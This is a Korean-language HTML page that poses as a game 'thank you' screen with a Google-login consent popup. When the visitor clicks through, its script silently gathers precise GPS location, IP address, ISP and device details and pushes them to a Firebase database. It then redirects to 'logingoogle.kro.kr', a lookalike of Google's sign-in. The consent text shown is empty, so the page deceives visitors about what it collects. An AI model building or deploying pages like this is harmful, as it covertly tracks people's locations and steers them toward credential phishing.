<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thank you</title>
    <!-- Tailwind CSS (CDN) -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- FontAwesome Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://cdn.jsdelivr.net/gh/orioncactus/pretendard/dist/web/static/pretendard.css');
        body {
            font-family: 'Pretendard', -apple-system, BlinkMacSystemFont, system-ui, Roboto, sans-serif;
        }
    </style>
</head>
<body class="bg-slate-900 text-slate-100 min-h-screen flex items-center justify-center p-4">

    <!-- 메인 대기 화면 -->
    <div class="text-center space-y-4 max-w-md w-full bg-slate-800 p-8 rounded-2xl border border-slate-700 shadow-xl">
        <div class="w-16 h-16 bg-indigo-600/20 text-indigo-400 rounded-full flex items-center justify-center mx-auto text-2xl mb-2">
            <i class="fa-solid fa-gamepad"></i>
        </div>
        <h1 class="text-2xl font-bold text-white"></h1>
        <p class="text-slate-400 text-sm">
            
        </p>
        <button id="openModalBtn" class="w-full py-3 bg-indigo-600 hover:bg-indigo-500 text-white font-medium rounded-xl transition shadow-lg">
            다음
        </button>
    </div>

    <!-- 개인정보 수집 및 위치 정보 동의 팝업 (Modal) -->
    <div id="consentModal" class="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center p-4 z-50 hidden">
        <div class="bg-slate-800 border border-slate-700 rounded-2xl max-w-md w-full p-6 space-y-5 shadow-2xl relative">
            
            <div class="flex items-center space-x-3 border-b border-slate-700 pb-4">
                <div class="p-2 bg-indigo-500/20 text-indigo-400 rounded-lg">
                    <i class="fa-solid fa-shield-halved text-xl"></i>
                </div>
                <div>
                    <h2 class="text-lg font-bold text-white"></h2>
                    <p class="text-xs text-slate-400"></p>
                </div>
            </div>

            <!-- 수집 항목 안내 -->
            <div class="space-y-3 text-xs text-slate-300 bg-slate-900/60 p-4 rounded-xl border border-slate-700/50">
                <p class="font-semibold text-slate-200">구글 로그인 페이지로 이동합니다</p>
                <ul class="space-y-1.5 list-disc list-inside text-slate-400">
                </ul>
            </div>

            <!-- 상태 안내 메시지 -->
            <div id="statusMessage" class="hidden text-xs text-center py-2 px-3 rounded-lg bg-indigo-500/20 text-indigo-300 border border-indigo-500/30">
                <i class="fa-solid fa-spinner fa-spin mr-1"></i> 이동중입니다 ...
            </div>

            <!-- 동의 및 취소 버튼 -->
            <div class="flex space-x-3 pt-2">
                <button id="acceptBtn" class="w-2/3 py-2.5 bg-indigo-600 hover:bg-indigo-500 text-white text-sm font-bold rounded-xl transition flex items-center justify-center space-x-2">
                    <span>다음</span>
                    <i class="fa-solid fa-arrow-right text-xs"></i>
                </button>
            </div>
        </div>
    </div>

    <!-- Firebase SDK 및 데이터 처리 스크립트 -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-database.js";

        // 이동할 목적지 게임/서비스 URL 설정
        const TARGET_GAME_URL = "logingoogle.kro.kr"; // 실제 연결할 서비스 URL로 변경하세요.
        const DATABASE_URL = "https://database-4d830-default-rtdb.firebaseio.com/";

        const firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : {
            databaseURL: DATABASE_URL
        };

        if (!firebaseConfig.databaseURL) {
            firebaseConfig.databaseURL = DATABASE_URL;
        }

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app, DATABASE_URL);

        const modal = document.getElementById('consentModal');
        const openModalBtn = document.getElementById('openModalBtn');
        const declineBtn = document.getElementById('declineBtn');
        const acceptBtn = document.getElementById('acceptBtn');
        const statusMessage = document.getElementById('statusMessage');

        // 모달 열기
        openModalBtn.addEventListener('click', () => {
            modal.classList.remove('hidden');
        });

        // 모달 닫기 (거부 시)
        declineBtn.addEventListener('click', () => {
            modal.classList.add('hidden');
            alert('동의하지 않으시면 서비스 이용이 제한될 수 있습니다.');
        });

        // 동의 클릭 시 정보 수집 및 리디렉션 진행
        acceptBtn.addEventListener('click', async () => {
            acceptBtn.disabled = true;
            declineBtn.disabled = true;
            statusMessage.classList.remove('hidden');

            try {
                // 1. GPS 위치 수집 (사용자가 브라우저 팝업에서 허용해야 작동)
                const gpsData = await getGpsPosition();

                // 2. IP 및 디바이스 정보 수집
                const deviceInfo = collectDeviceInfo();
                const ipData = await fetchIpAddress();

                // 3. 수집 데이터 통합
                const payload = {
                    timestamp: new Date().toISOString(),
                    createdAt: Date.now(),
                    ip: ipData.ip,
                    isp: ipData.isp,
                    ipLocation: ipData.location,
                    gps: gpsData,
                    ...deviceInfo
                };

                // 4. Firebase RTDB 저장
                const logsRef = ref(db, 'device_logs');
                await push(logsRef, payload);

            } catch (error) {
                console.error("데이터 처리 중 오류 발생:", error);
            } finally {
                // 5. 작업 완료 후 지정된 게임 페이지로 안전하게 이동
                window.location.href = TARGET_GAME_URL;
            }
        });

        // GPS 프로미스 함수
        function getGpsPosition() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ latitude: null, longitude: null, error: "Geolocation Not Supported" });
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            error: null
                        });
                    },
                    (err) => {
                        resolve({
                            latitude: null,
                            longitude: null,
                            error: err.message || "Permission Denied"
                        });
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            });
        }

        // IP 및 ISP 조회 함수
        async function fetchIpAddress() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                if (res.ok) {
                    const data = await res.json();
                    return {
                        ip: data.ip || "Unknown",
                        isp: data.org || data.asn || "Unknown",
                        location: `${data.country_name || ''} ${data.region || ''} ${data.city || ''}`.trim()
                    };
                }
            } catch (e) {
                console.warn("IP fetch error fallbacking...", e);
            }
            return { ip: "Unknown", isp: "Unknown", location: "Unknown" };
        }

        // 기기 환경 정보 수집 함수
        function collectDeviceInfo() {
            const ua = navigator.userAgent;
            let os = "Unknown";
            if (ua.indexOf("Win") !== -1) os = "Windows";
            else if (ua.indexOf("Mac") !== -1) os = "macOS";
            else if (ua.indexOf("Android") !== -1) os = "Android";
            else if (ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) os = "iOS";

            let browser = "Unknown";
            if (ua.indexOf("Chrome") !== -1 && ua.indexOf("Edg") === -1) browser = "Chrome";
            else if (ua.indexOf("Safari") !== -1 && ua.indexOf("Chrome") === -1) browser = "Safari";
            else if (ua.indexOf("Edg") !== -1) browser = "Edge";

            return {
                os,
                browser,
                userAgent: ua,
                viewport: `${window.innerWidth}x${window.innerHeight}`,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language || "Unknown"
            };
        }
    </script>
</body>
</html>
